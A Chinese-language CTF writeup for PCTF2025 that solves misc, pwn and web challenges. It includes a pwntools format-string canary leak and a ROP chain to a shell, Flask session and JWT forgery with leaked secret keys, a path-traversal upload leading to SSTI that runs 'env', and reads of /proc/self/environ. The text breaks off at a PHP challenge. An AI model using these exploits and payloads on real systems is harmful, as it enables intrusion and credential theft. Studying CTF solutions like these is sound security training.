# [个人队伍] PCTF2025的Writeup



# All

## Misc

### 签到

#### 解题过程

**查看提示**

```shell
"请仔细阅读相关比赛信息，遵守比赛规则，共同营造良好比赛环境

cat /flag

Your flag：PCTF{Welcome_tO_PCTF_2025_!!!!}"
```

**得到：PCTF{Welcome_tO_PCTF_2025_!!!!}**



## Pwn

### test_your_nc

#### 解题过程

**查看源码**

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  int v4; // eax
  int v5; // r9d
  int v6; // r9d
  int v7; // r9d
  int v8; // r9d
  int v9; // r9d
  char v11; // [rsp+0h] [rbp-2AA0h]
  char v12; // [rsp+0h] [rbp-2AA0h]
  int correct_count; // [rsp+Ch] [rbp-2A94h]
  int i; // [rsp+10h] [rbp-2A90h]
  int numeration; // [rsp+14h] [rbp-2A8Ch]
  int op; // [rsp+1Ch] [rbp-2A84h]
  int64_t b; // [rsp+20h] [rbp-2A80h]
  int64_t number1; // [rsp+28h] [rbp-2A78h]
  int64_t number1a; // [rsp+28h] [rbp-2A78h]
  int64_t number1b; // [rsp+28h] [rbp-2A78h]
  int64_t number2; // [rsp+30h] [rbp-2A70h]
  int64_t number2a; // [rsp+30h] [rbp-2A70h]
  int64_t number2b; // [rsp+30h] [rbp-2A70h]
  int64_t a; // [rsp+38h] [rbp-2A68h]
  char *s; // [rsp+40h] [rbp-2A60h]
  FILE *fp; // [rsp+48h] [rbp-2A58h]
  __mpz_struct ans[1]; // [rsp+50h] [rbp-2A50h] BYREF
  __mpz_struct user_val[1]; // [rsp+60h] [rbp-2A40h] BYREF
  __mpz_struct n1[1]; // [rsp+70h] [rbp-2A30h] BYREF
  __mpz_struct n2[1]; // [rsp+80h] [rbp-2A20h] BYREF
  char buf1[1280]; // [rsp+90h] [rbp-2A10h] BYREF
  char flag[1280]; // [rsp+590h] [rbp-2510h] BYREF
  char input[8200]; // [rsp+A90h] [rbp-2010h] BYREF
  unsigned __int64 v34; // [rsp+2A98h] [rbp-8h]

  v34 = __readfsqword(0x28u);
  banner();
  puts("Welcome to PCTF2025!");
  puts("So let's test your pwntools!");
  correct_count = 0;
  for ( i = 0; i < 2025; ++i )
  {
    if ( get_random() < 0 )
      v3 = -get_random() % 34 + 2;
    else
      v3 = get_random() % 34 + 2;
    numeration = v3;
    if ( v3 <= 1 )
      numeration = 2;
    if ( numeration > 36 )
      numeration = 36;
    if ( get_random() < 0 )
      v4 = -(int)get_random() & 3;
    else
      v4 = get_random() & 3;
    op = v4;
    _gmpz_inits((unsigned int)ans, (unsigned int)user_val, (unsigned int)n1, (unsigned int)n2, 0, v5, v11);
    if ( op )
    {
      if ( op == 1 )
      {
        number1a = rnd_range_int64(0xFFFC000000000000LL, 0x3FFFFFFFFFFFFLL);
        number2a = rnd_range_int64(0xFFFC000000000000LL, 0x3FFFFFFFFFFFFLL);
        _gmpz_set_si(n1, number1a);
        _gmpz_set_si(n2, number2a);
        _gmpz_sub(ans, n1, n2);
        base_convert_int(number1a, numeration, buf1, 1280);
        base_convert_int(number2a, numeration, flag, 1280);
        printf("[%04d] (base %d) %s - %s = ?\n", i + 1, numeration, buf1, flag);
      }
      else if ( op == 2 )
      {
        number1b = rnd_range_int64(-1000000LL, 1000000LL);
        number2b = rnd_range_int64(-1000000LL, 1000000LL);
        _gmpz_set_si(n1, number1b);
        _gmpz_set_si(n2, number2b);
        _gmpz_mul(ans, n1, n2);
        base_convert_int(number1b, numeration, buf1, 1280);
        base_convert_int(number2b, numeration, flag, 1280);
        printf("[%04d] (base %d) %s * %s = ?\n", i + 1, numeration, buf1, flag);
      }
      else
      {
        a = rnd_range_int64(0xFFFC000000000000LL, 0x3FFFFFFFFFFFFLL);
        for ( b = 0LL; !b; b = rnd_range_int64(-1000000LL, 1000000LL) )
          ;
        _gmpz_set_si(n1, a);
        _gmpz_set_si(n2, b);
        _gmpz_mod(ans, n1, n2);
        base_convert_int(a, numeration, buf1, 1280);
        base_convert_int(b, numeration, flag, 1280);
        printf("[%04d] (base %d) %s %% %s = ?\n", i + 1, numeration, buf1, flag);
      }
    }
    else
    {
      number1 = rnd_range_int64(0xFFFC000000000000LL, 0x3FFFFFFFFFFFFLL);
      number2 = rnd_range_int64(0xFFFC000000000000LL, 0x3FFFFFFFFFFFFLL);
      _gmpz_set_si(n1, number1);
      _gmpz_set_si(n2, number2);
      _gmpz_add(ans, n1, n2);
      base_convert_int(number1, numeration, buf1, 1280);
      base_convert_int(number2, numeration, flag, 1280);
      printf("[%04d] (base %d) %s + %s = ?\n", i + 1, numeration, buf1, flag);
    }
    printf("Your answer (in base %d): ", numeration);
    fflush(stdout);
    if ( !fgets(input, 0x2000, stdin) )
    {
      _gmpz_clears((unsigned int)ans, (unsigned int)user_val, (unsigned int)n1, (unsigned int)n2, 0, v6, v12);
      break;
    }
    trim_trailing_ws(input);
    if ( input[0] )
    {
      if ( (unsigned int)_gmpz_set_str(user_val, input, (unsigned int)numeration) )
      {
        puts("Invalid answer, counted as incorrect.");
        _gmpz_clears((unsigned int)ans, (unsigned int)user_val, (unsigned int)n1, (unsigned int)n2, 0, v8, v12);
      }
      else
      {
        if ( (unsigned int)_gmpz_cmp(user_val, ans) )
        {
          s = (char *)_gmpz_get_str(0LL, (unsigned int)numeration, ans);
          printf("Incorrect. Correct answer: %s\n", s);
          free(s);
        }
        else
        {
          puts("Correct!");
          ++correct_count;
        }
        _gmpz_clears((unsigned int)ans, (unsigned int)user_val, (unsigned int)n1, (unsigned int)n2, 0, v9, v12);
      }
    }
    else
    {
      puts("Empty answer, counted as incorrect.");
      _gmpz_clears((unsigned int)ans, (unsigned int)user_val, (unsigned int)n1, (unsigned int)n2, 0, v7, v12);
    }
  }
  printf("You answered %d out of %d correctly.\n", correct_count, 2025);
  if ( correct_count == 2025 )
  {
    fp = fopen("/flag", "r");
    memset(flag, 0, 256);
    if ( fgets(flag, 256, fp) )
      puts(flag);
    fclose(fp);
  }
  else
  {
    puts("Better luck next time!");
  }
  return 0;
}
```

**分析**

- 没有漏洞

**测试连接**

```shell
nc challenge.imxbt.cn 30809
```

```shell
Welcome to PCTF2025!
So let's test your pwntools!
[0001] (base 23) 4ii06h2gg33l6m * g6f5idg12bgik8 = ?
Your answer (in base 23):
Empty answer, counted as incorrect.
[0002] (base 19) 516ch3a88habi68 + 7986453fg9815b9 = ?
Your answer (in base 19):
Empty answer, counted as incorrect.
[0003] (base 2) 1101100011111100000100001111011100101111000100101011001011001 + 10010000111110000010101011100000111110111001000100011111011001 = ?
Your answer (in base 2):
```

**最终脚本**

```python
def turnBase(num: any, base: any = 10) -> str:
    chars = "0123456789abcdefghijklmnopqrstuvwxyz"
    if num == 0:
        return "0"
    is_negative = False
    if num < 0:
        is_negative = True
        num = abs(num)
    res = ""
    while num > 0:
        remainder = num % base
        res = chars[remainder] + res
        num = num // base
    return "-" + res if is_negative else res

from pwn import *

r = remote("challenge.imxbt.cn", 30809)

for i in range(2025):
    r.recvuntil("(base ".encode())
    base = int(r.recvuntil(') '.encode()).decode().strip().replace(')', ''))

    a = int(r.recvuntil(' '.encode()).decode().strip(), base)
    op = r.recvuntil(' '.encode()).decode().strip()
    b = int(r.recvuntil(' '.encode()).decode().strip(), base)

    result = ''
    if op.__contains__("+"):
        result = turnBase(a + b, base)
    elif op.__contains__("-"):
        result = turnBase(a - b, base)
    elif op.__contains__("*"):
        result = turnBase(a * b, base)
    elif op.__contains__("%"):
        result = turnBase(a % b, base)

    r.sendlineafter(": ".encode(), result.encode())

    responses = r.recvline().decode().strip()
    print(f"[{i + 1}/2025] (base {base}) {a} {op} {b} = {result} ({responses})")

r.interactive()
```

```shell
[2020/2025] (base 2) 4211585386669123148 - 2462269859783395786 = 1100001000110110100010011010000010100000110010101110010000010 (Correct!)
[2021/2025] (base 2) 1643724213786073034 - 3950050137298789353 = -10000000000001101101110011010100111111010000000000110000011111 (Correct!)
[2022/2025] (base 32) 8219379775512047467 % 3247826166779317823 = 1fqv8v75jjknd (Correct!)
[2023/2025] (base 2) 6308269224368073698 * 1582067913783619215 = 111100000100001100101101101111011000110101011011111100001101100000100100110110011011101010101001100001101010101111100111110 (Correct!)
[2024/2025] (base 2) 6410947805688581131 - 1206696976470622242 = 100100000111001001101101000111001001101100100011000101111101001 (Correct!)
[2025/2025] (base 2) 8189901439791103421 + 4428953678977708416 = 1010111100011111001011011101111101111010010101011010111100111101 (Correct!)
[*] Switching to interactive mode
You answered 2025 out of 2025 correctly.
PCTF{db8b6137-f4d8-4d3f-98fb-ad9c76caf6bd}
[*] Got EOF while reading in interactive
```

**得到：PCTF{db8b6137-f4d8-4d3f-98fb-ad9c76caf6bd}**



### ezfmt

#### 解题过程

**信息搜集**

```shell
checksec pwn
```

```shell
[*] '/home/kali/Desktop/ctf/pwn/pwn'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

**分析**

- Linux64位小端序
- Canary

**查看源码**

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char buf[104]; // [rsp+0h] [rbp-70h] BYREF
  unsigned __int64 v5; // [rsp+68h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  init(argc, argv, envp);
  puts("What's your id??");
  read(0, buf, 0x100uLL);
  strncpy(name, buf, 0x60uLL);
  printf("Welcome,");
  printf("%s", name);
  puts("Do you wanna say something?");
  read(0, buf, 0x200uLL);
  return 0;
}
```

**分析**

- 存在两个栈溢出和格式化漏洞
- 可用先用第一个输入泄露canary和libc_base_addr
- 然后再用第二个输入执行rop

**数据搜集**

```shell
ropper -f libc.so.6 --search "pop rdi; ret;"
```

```shell
0x000000000002a3e5: pop rdi; ret;
```

```shell
ropper -f libc.so.6 --search "ret;"
```

```shell
0x0000000000029139: ret;
```

```assembly
.data:0000000000404020 name            db '???',0              ; DATA XREF: main+5B↑o
.data:0000000000404020                                         ; main+7E↑o
.data:0000000000404024                 db    0
.data:0000000000404025                 db    0
.data:0000000000404026                 db    0
.data:0000000000404027                 db    0
.data:0000000000404028                 db    0
.data:0000000000404029                 db    0
.data:000000000040402A                 db    0
.data:000000000040402B                 db    0
.data:000000000040402C                 db    0
.data:000000000040402D                 db    0
.data:000000000040402E                 db    0
.data:000000000040402F                 db    0
.data:0000000000404030                 db    0
.data:0000000000404031                 db    0
.data:0000000000404032                 db    0
.data:0000000000404033                 db    0
.data:0000000000404034                 db    0
.data:0000000000404035                 db    0
.data:0000000000404036                 db    0
.data:0000000000404037                 db    0
.data:0000000000404038                 db    0
.data:0000000000404039                 db    0
.data:000000000040403A                 db    0
.data:000000000040403B                 db    0
.data:000000000040403C                 db    0
.data:000000000040403D                 db    0
.data:000000000040403E                 db    0
.data:000000000040403F                 db    0
.data:0000000000404040                 db    0
.data:0000000000404041                 db    0
.data:0000000000404042                 db    0
.data:0000000000404043                 db    0
.data:0000000000404044                 db    0
.data:0000000000404045                 db    0
.data:0000000000404046                 db    0
.data:0000000000404047                 db    0
.data:0000000000404048                 db    0
.data:0000000000404049                 db    0
.data:000000000040404A                 db    0
.data:000000000040404B                 db    0
.data:000000000040404C                 db    0
.data:000000000040404D                 db    0
.data:000000000040404E                 db    0
.data:000000000040404F                 db    0
.data:0000000000404050                 db    0
.data:0000000000404051                 db    0
.data:0000000000404052                 db    0
.data:0000000000404053                 db    0
.data:0000000000404054                 db    0
.data:0000000000404055                 db    0
.data:0000000000404056                 db    0
.data:0000000000404057                 db    0
.data:0000000000404058                 db    0
.data:0000000000404059                 db    0
.data:000000000040405A                 db    0
.data:000000000040405B                 db    0
.data:000000000040405C                 db    0
.data:000000000040405D                 db    0
.data:000000000040405E                 db    0
.data:000000000040405F                 db    0
.data:0000000000404060                 public format
.data:0000000000404060 ; char format[3]
.data:0000000000404060 format          db '%s',0               ; DATA XREF: main+88↑o
```

**分析**

- `name`到`format`之间只有`64`个字符的距离
- 但是`strncpy(name, buf, 0x60uLL)`会将`name`拷贝`96`个字符从而覆盖掉`format`的`%s`造成`printf`无输出
- 我们直接覆盖`format`的内容就好了，不需要用`name`

**最终脚本**

```python
from pwn import *

r = remote("challenge.imxbt.cn", 32255)
libc = ELF("./libc.so.6")

payload = cyclic(64)
payload += "|%19$p|%41$p|".encode()
payload += '\x00'.encode()
r.sendlineafter("?\n".encode(), payload)

r.recvuntil('|'.encode())
canary = int(r.recvuntil('|'.encode()).decode().replace('|', ''), 16)
print("canary", hex(canary))

libc_addr = int(r.recvuntil('|'.encode()).decode().replace('|', ''), 16) - 128
libc_offset = 0x29dc0
libc_base_addr = libc_addr - libc_offset
print("libc_base_addr", libc_base_addr)

pop_rdi_ret_libc_offset = 0x2a3e5
pop_rdi_ret_libc_addr = libc_base_addr + pop_rdi_ret_libc_offset
bin_sh_libc_offset = next(libc.search("/bin/sh".encode()))
bin_sh_libc_addr = libc_base_addr + bin_sh_libc_offset
ret_libc_offset = 0xf8089
ret_libc_addr = libc_base_addr + ret_libc_offset
system_libc_offset = libc.sym["system"]
system_libc_addr = libc_base_addr + system_libc_offset

payload = cyclic(104)
payload += p64(canary)
payload += p64(0xdeadbeef)
payload += p64(pop_rdi_ret_libc_addr) + p64(bin_sh_libc_addr) + p64(ret_libc_addr) + p64(system_libc_addr)
r.sendafter("?\n".encode(), payload)

r.interactive()
```

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
[x] Opening connection to challenge.imxbt.cn on port 32255
[x] Opening connection to challenge.imxbt.cn on port 32255: Trying 119.188.240.24
[+] Opening connection to challenge.imxbt.cn on port 32255: Done
[*] 'D:\\Work\\test\\testPython\\src\\com\\probie\\test01\\libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
canary 0xc99f0d36604d4700
libc_base_addr 137025734066176
[*] Switching to interactive mode
ls
attachment
bin
dev
flag
lib
lib32
lib64
libexec
libx32
cat flag
PCTF{dd0a4bf7-f5b6-4332-9c2d-c240a588a8bc}
```

**得到：PCTF{dd0a4bf7-f5b6-4332-9c2d-c240a588a8bc}**



## Web

### Do_you_know_session?

#### 题目信息

> ## Do_you_know_session?250 pts
>
> "DO YOU REALLY KNOW SESSION IN FLASK?>>>"

#### 解题过程

**查看题目**

```shell
{{config}}
```

```shell
&lt;Config {&#39;DEBUG&#39;: False, &#39;TESTING&#39;: False, &#39;PROPAGATE_EXCEPTIONS&#39;: None, &#39;SECRET_KEY&#39;: &#39;1919810#mistyovo@foxdog@lzz0403#114514&#39;, &#39;SECRET_KEY_FALLBACKS&#39;: None, &#39;PERMANENT_SESSION_LIFETIME&#39;: datetime.timedelta(days=31), &#39;USE_X_SENDFILE&#39;: False, &#39;TRUSTED_HOSTS&#39;: None, &#39;SERVER_NAME&#39;: None, &#39;APPLICATION_ROOT&#39;: &#39;/&#39;, &#39;SESSION_COOKIE_NAME&#39;: &#39;session&#39;, &#39;SESSION_COOKIE_DOMAIN&#39;: None, &#39;SESSION_COOKIE_PATH&#39;: None, &#39;SESSION_COOKIE_HTTPONLY&#39;: True, &#39;SESSION_COOKIE_SECURE&#39;: False, &#39;SESSION_COOKIE_PARTITIONED&#39;: False, &#39;SESSION_COOKIE_SAMESITE&#39;: None, &#39;SESSION_REFRESH_EACH_REQUEST&#39;: True, &#39;MAX_CONTENT_LENGTH&#39;: None, &#39;MAX_FORM_MEMORY_SIZE&#39;: 500000, &#39;MAX_FORM_PARTS&#39;: 1000, &#39;SEND_FILE_MAX_AGE_DEFAULT&#39;: None, &#39;TRAP_BAD_REQUEST_ERRORS&#39;: None, &#39;TRAP_HTTP_EXCEPTIONS&#39;: False, &#39;EXPLAIN_TEMPLATE_LOADING&#39;: False, &#39;PREFERRED_URL_SCHEME&#39;: &#39;http&#39;, &#39;TEMPLATES_AUTO_RELOAD&#39;: None, &#39;MAX_COOKIE_SIZE&#39;: 4093, &#39;PROVIDE_AUTOMATIC_OPTIONS&#39;: True}&gt;
```

**分析**

- 测试发现search功能存在ssti漏洞，拿到secret-key为**1919810#mistyovo@foxdog@lzz0403#114514**

```shell
Cookie: session= 
eyJ1c2VybmFtZSI6Imd1ZXN0In0.adck9Q.P78ttbztUg66wYMFoczdmxAZjOs
```

```json
{
  "username": "guest"
}
```

**分析**

- 在cookie中发现存在session身份验证
- 我们可以尝试篡改权限为admin

```shell
python flask_session_cookie_manager3.py encode -s 1919810#mistyovo@foxdog@lzz0403#114514 -t "{'username':'admin'}"
```

```shell
eyJ1c2VybmFtZSI6ImFkbWluIn0.adcnhA.VONvOzg7Px-U6-L6ejg7CsPGU8k
```

**发起攻击**

```shell
/proc/self/environ
```

```shell
WebApp
index
Admin
Read
📖 文件读取
安全的文件读取功能

⚠️ 注意： 只有管理员用户才能使用文件读取功能。请确保您有相应的权限。
文件路径：
/proc/self/environ
读取文件
示例文件路径：
/etc/passwd
/etc/hosts
app.py
requirements.txt
📄 文件内容：
PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=pctf2025-adc8caffdaf24a66PYTHON_VERSION=3.14.0PYTHON_SHA256=2299dae542d395ce3883aca00d3c910307cd68e0b2f7336098c8e7b7eee9f3e9GZCTF_FLAG=PCTF{7adc96b1-c97e-41b3-aa23-726544243f1b}GZCTF_TEAM_ID=3440KUBERNETES_SERVICE_HOST=10.96.0.1KUBERNETES_SERVICE_PORT=443KUBERNETES_SERVICE_PORT_HTTPS=443KUBERNETES_PORT=tcp://10.96.0.1:443KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443KUBERNETES_PORT_443_TCP_PROTO=tcpKUBERNETES_PORT_443_TCP_PORT=443KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1HOME=/root
```

#### 题目答案

**得到：PCTF{7adc96b1-c97e-41b3-aa23-726544243f1b}**



### Jwt_password_manager

#### 题目信息

> ## Jwt_password_manager250 pts
>
> "**Safety JWT Password Manager** is now live !!! 🔥🔥🔥
>
> This dashboard features JWT authentication, making it easy for you to store and manage your passwords so you won't forget them.
>
> For more information about **JWT**, visit jwt.io !"

#### 解题过程

**查看源码**

```python
'''
Item: Safety Jwt Password Mananer
Time: 2025-10-23
Author: 1ceLAND
'''

from flask import Flask, request, redirect, url_for, render_template
import jwt
import uuid
import os

from werkzeug.security import generate_password_hash, check_password_hash


app = Flask(__name__)
app.config['SECRET_KEY'] = '0f3cbb44-f199-4d34-ade9-1545c0972648'

accounts_usernames = []
accounts = {} # help save accounts instead sqlite

# instead of sqliteeee
user_passwords = {}

def check_username(new_username):
    if new_username in accounts_usernames:
        return True
    return False

def check_login(username, password):
    if username not in accounts:
        return False
    return check_password_hash(accounts[username], password)

def insert_account(new_username, new_password_hash):
    try:
        accounts_usernames.append(new_username)
        accounts[new_username] = new_password_hash
        user_passwords[new_username] = []
        return True
    except:
        return False

def create_token(username):
    # create jwt
    payload = {
        'username': username,
    }
    token = jwt.encode(payload, app.config['SECRET_KEY'], algorithm='HS256')
    if isinstance(token, bytes):
        token = token.decode('utf-8')
    return token

def verify_token(token):
    try:
        payload = jwt.decode(token, app.config['SECRET_KEY'], algorithms=['HS256'])
        return payload['username']
    except:
        return None

def login_required(f):
    def decorated(*args, **kwargs):
        token = request.cookies.get('token')
        if not token or not verify_token(token):
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    decorated.__name__ = f.__name__
    return decorated

def add_password_item(username, website, site_username, password, notes=""):
    try:
        password_item = {
            'id': str(uuid.uuid4()),
            'website': website,
            'username': site_username,
            'password': password,
            'notes': notes,
        }
        user_passwords[username].append(password_item)
        return True
    except:
        return False


def delete_password_item(username, item_id):
    # delete ...
    try:
        user_passwords[username] = [item for item in user_passwords[username] if item['id'] != item_id]
        return True
    except:
        return False
        
def get_user_passwords(username):
    # get all password_item of someone ...
    return user_passwords.get(username, [])

@app.route('/')
def index():
    return redirect(url_for('login'))

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        
        user_exists = check_username(username)
        if user_exists:
            return render_template('register.html', error_msg="User Already Existed!")

        password_hash = generate_password_hash(password)
        insert_account(username, password_hash)
        
        return redirect(url_for('login'))
    
    return render_template('register.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']

        user_exists = check_username(username)
        if user_exists == False:
            return render_template('login.html', error_msg='Username or Password Wrong!')
        
        if check_login(username, password):
            token = create_token(username)
            response = redirect(url_for('dashboard'))
            response.set_cookie('token', token, httponly=True)
            return response
        else:
            return render_template('login.html', error_msg='Username or Password Wrong!')
        
    return render_template('login.html')

@app.route('/logout')
def logout():
    response = redirect(url_for('login'))
    response.delete_cookie('token')
    return response

@app.route('/dashboard')
@login_required
def dashboard():
    username = verify_token(request.cookies.get('token'))
    passwords = get_user_passwords(username)
    return render_template('dashboard.html',
                           username=username,
                           passwords=passwords)
    
@app.route('/add_password', methods=['POST'])
@login_required
def add_password():
    username = verify_token(request.cookies.get('token'))
    website = request.form['website']
    site_username = request.form['site_username']
    password = request.form['password']
    notes = request.form.get('notes', '')
    
    if add_password_item(username, website, site_username, password, notes):
        return redirect(url_for('dashboard'))
    else:
        return render_template('dashboard.html', 
                             username=username,
                             passwords=get_user_passwords(username),
                             error_msg="Add password error")
        
@app.route('/delete_password/<item_id>')
@login_required
def delete_password(item_id):
    username = verify_token(request.cookies.get('token'))
    
    if delete_password_item(username, item_id):
        return redirect(url_for('dashboard'))
    else:
        return render_template('dashboard.html', 
                             username=username,
                             passwords=get_user_passwords(username),
                             error_msg="Delete password error")

if __name__ == '__main__':
    admin_password = str(uuid.uuid4())
    insert_account('admin', generate_password_hash(admin_password))
    
    # flag in admin account ! ^-^
    for path in ['/flag', './flag.txt']:
        try:
            if os.path.exists(path) and os.path.isfile(path):
                with open(path, 'rb') as f:
                    raw = f.read()
                if raw:
                    content = raw.decode('utf-8', errors='replace').strip()
                    add_password_item('admin',
                                      website='seeded-flag',
                                      site_username='flag-file',
                                      password=content,
                                      notes=f'seeded from {path}')
                break
        except:
            pass
    app.run(debug=False, host='0.0.0.0')
```

**分析**

- **app.config['SECRET_KEY'] = '0f3cbb44-f199-4d34-ade9-1545c0972648'**
- 我们先注册一个账号，获得Cookie里的token数据
- 然后修改username为admin
- 填入SECRET_KEY
- BP抓包改token

#### 题目答案

```shell
 seeded-flag	flag-file	PCTF{7ac29dd0-66c4-48cf-9b44-d46cbaff0693}	seeded from /flag
```

**得到：PCTF{7ac29dd0-66c4-48cf-9b44-d46cbaff0693}**



### ez_upload

#### 题目信息

> ez_upload
> 250 pts
>
> "这是个简单的文件上传 file路由可以查看文件"

#### 解题过程

**查看源码**

```shell
?file=app.py
```

```python
import os
import uuid
from flask import Flask, request, render_template_string, redirect, url_for, send_from_directory, flash, jsonify
from werkzeug.exceptions import RequestEntityTooLarge

app = Flask(__name__)
app.secret_key = 'your_secret_key_here'

UPLOAD_FOLDER = 'uploads'
MAX_FILE_SIZE = 16 * 1024 * 1024
ALLOWED_EXTENSIONS = {'txt', 'pdf', 'png', 'jpg', 'jpeg', 'gif', 'doc', 'docx', 'zip', 'html'}

BLACKLIST_KEYWORDS = [
    'env', '.env', 'environment', 'profile', 'bashrc',
    'proc', 'sys', 'etc', 'passwd', 'shadow', 'flag'
]

app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.config['MAX_CONTENT_LENGTH'] = MAX_FILE_SIZE

if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

@app.route('/')
def index():
    try:
        with open('templates/index.html', 'r', encoding='utf-8') as f:
            template_content = f.read()
        return render_template_string(template_content)
    except FileNotFoundError:
        try:
            with open('templates/error_template_not_found.html', 'r', encoding='utf-8') as f:
                return f.read()
        except:
            return '<h1>错误</h1><p>模板文件未找到</p><a href="/upload">上传文件</a>'
    except Exception as e:
        try:
            with open('templates/error_render.html', 'r', encoding='utf-8') as f:
                template = f.read()
            return render_template_string(template, error_message=str(e))
        except:
            return '<h1>渲染错误</h1><p>' + str(e) + '</p><a href="/upload">上传文件</a>'

@app.route('/upload', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        if 'file' not in request.files:
            flash('没有选择文件')
            return redirect(request.url)
        
        file = request.files['file']
        
        if file.filename == '':
            flash('没有选择文件')
            return redirect(request.url)
        
        if file and allowed_file(file.filename):
            filename = file.filename
            filename = filename.replace('../', '')
            file_path = os.path.join(UPLOAD_FOLDER, filename)
            
            try:
                file.save(file_path)
                flash('文件 {} 上传成功！'.format(filename))
                return redirect('/upload')
            except Exception as e:
                flash('文件上传失败: {}'.format(str(e)))
                return redirect(request.url)
        else:
            flash('不允许的文件类型')
            return redirect(request.url)
    
    try:
        with open('templates/upload.html', 'r', encoding='utf-8') as f:
            template_content = f.read()
        return render_template_string(template_content)
    except FileNotFoundError:
        try:
            with open('templates/error_upload_not_found.html', 'r', encoding='utf-8') as f:
                return f.read()
        except:
            return '<h1>错误</h1><p>上传页面模板未找到</p><a href="/">返回主页</a>'

@app.route('/file')
def view_file():
    file_path = request.args.get('file', '')
    
    if not file_path:
        try:
            with open('templates/file_no_param.html', 'r', encoding='utf-8') as f:
                return f.read()
        except:
            return '<h1>文件查看</h1><p>请使用 ?file= 参数指定要查看的文件</p><a href="/">返回主页</a>'
    
    file_path_lower = file_path.lower()
    for keyword in BLACKLIST_KEYWORDS:
        if keyword in file_path_lower:
            try:
                with open('templates/file_error.html', 'r', encoding='utf-8') as f:
                    template = f.read()
                return render_template_string(template, 
                    file_path=file_path, 
                    error_message='访问被拒绝：文件路径包含敏感关键词 [{}]'.format(keyword))
            except:
                return '<h1>访问被拒绝</h1><p>文件路径包含敏感关键词</p><a href="/">返回主页</a>'
    
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            file_content = f.read()
        
        try:
            with open('templates/file_view.html', 'r', encoding='utf-8') as f:
                template = f.read()
            return render_template_string(template, file_path=file_path, file_content=file_content)
        except:
            return '<h1>文件内容</h1><pre>{}</pre><a href="/">返回主页</a>'.format(file_content)
    except Exception as e:
        try:
            with open('templates/file_error.html', 'r', encoding='utf-8') as f:
                template = f.read()
            return render_template_string(template, file_path=file_path, error_message=str(e))
        except:
            return '<h1>文件读取失败</h1><p>错误: {}</p><a href="/">返回主页</a>'.format(str(e))


@app.errorhandler(RequestEntityTooLarge)
def too_large(e):
    try:
        with open('templates/error_too_large.html', 'r', encoding='utf-8') as f:
            template = f.read()
        return render_template_string(template, max_size=MAX_FILE_SIZE // (1024*1024)), 413
    except:
        return '<h1>文件过大</h1><p>文件大小不能超过 {} MB</p>'.format(MAX_FILE_SIZE // (1024*1024)), 413

@app.errorhandler(404)
def not_found(e):
    try:
        with open('templates/error_404.html', 'r', encoding='utf-8') as f:
            return f.read(), 404
    except:
        return '<h1>404</h1><p>页面不存在</p>', 404

@app.errorhandler(500)
def server_error(e):
    try:
        with open('templates/error_500.html', 'r', encoding='utf-8') as f:
            template = f.read()
        return render_template_string(template, error_message=str(e)), 500
    except:
        return '<h1>500</h1><p>服务器内部错误: {}</p>'.format(str(e)), 500

if __name__ == '__main__':
    print("启动Flask文件上传应用...")
    print("上传目录: {}".format(UPLOAD_FOLDER))
    print("最大文件大小: {} MB".format(MAX_FILE_SIZE // (1024*1024)))
    print("允许的文件类型: {}".format(ALLOWED_EXTENSIONS))
    app.run(debug=False, host='0.0.0.0', port=5000)
```

**分析**

- 这里存在ssti

  ```python
          with open('templates/index.html', 'r', encoding='utf-8') as f:
              template_content = f.read()
          return render_template_string(template_content)
  ```

- 这里存在路径穿越

  ```python
          if file and allowed_file(file.filename):
              filename = file.filename
              filename = filename.replace('../', '')
              file_path = os.path.join(UPLOAD_FOLDER, filename)
  ```

  我们可以抓包构造路径**....//templates/index.html**覆盖index.html

- 然后利用ssti

  ```python
  {{lipsum.__globals__.os.popen('env').read()}}
  ```

  实现任意代码执行

#### 题目答案

```shell
KUBERNETES_PORT=tcp://10.96.0.1:443 KUBERNETES_SERVICE_PORT=443 HOSTNAME=pctf2025-5081274165324ed7 HOME=/root GPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696D PYTHON_SHA256=8d3ed8ec5c88c1c95f5e558612a725450d2452813ddad5e58fdb1a53b1209b78 WERKZEUG_SERVER_FD=3 KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1 PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin KUBERNETES_PORT_443_TCP_PORT=443 GZCTF_FLAG=PCTF{95314b99-c1db-4225-bc1c-aca31f79aa00} KUBERNETES_PORT_443_TCP_PROTO=tcp LANG=C.UTF-8 PYTHON_VERSION=3.11.14 KUBERNETES_SERVICE_PORT_HTTPS=443 KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443 KUBERNETES_SERVICE_HOST=10.96.0.1 PWD=/app GZCTF_TEAM_ID=3440
```

**得到：PCTF{95314b99-c1db-4225-bc1c-aca31f79aa00}**



### **ezezeval**

#### 题目信息

> ## ezezeval318 pts
>
> "告诉你吧，flag在/love1145141919810 flag格式:PCTF{[0-9a-z]{8}-[0-9a-z]{4}-[0-9a-z]{4}-[0-9a-z]{4}-[0-9a-z]{12}} 本题来源于XCTF 9th Final (注：此题为挑战题，贴近真实比赛与真实生产场景，并非新生赛难度，请各位量力而行。) "

#### 解题过程

**查看题目**

```php
<?php
